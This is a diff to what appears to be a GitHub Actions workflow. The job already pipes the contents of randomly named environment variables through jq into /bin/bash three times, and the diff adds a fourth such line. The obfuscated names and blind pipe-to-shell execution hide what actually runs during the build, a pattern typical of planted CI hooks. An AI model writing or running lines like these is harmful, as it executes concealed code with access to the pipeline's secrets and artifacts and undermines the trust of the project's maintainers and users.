@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$belks4555" | jq -r .ygq65782 | /bin/bash
           echo $mz46 | jq -r .y57 | /bin/bash
           echo $zce836 | jq -r .l76 | /bin/bash
+          echo $co7 | jq -r .nail14770 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
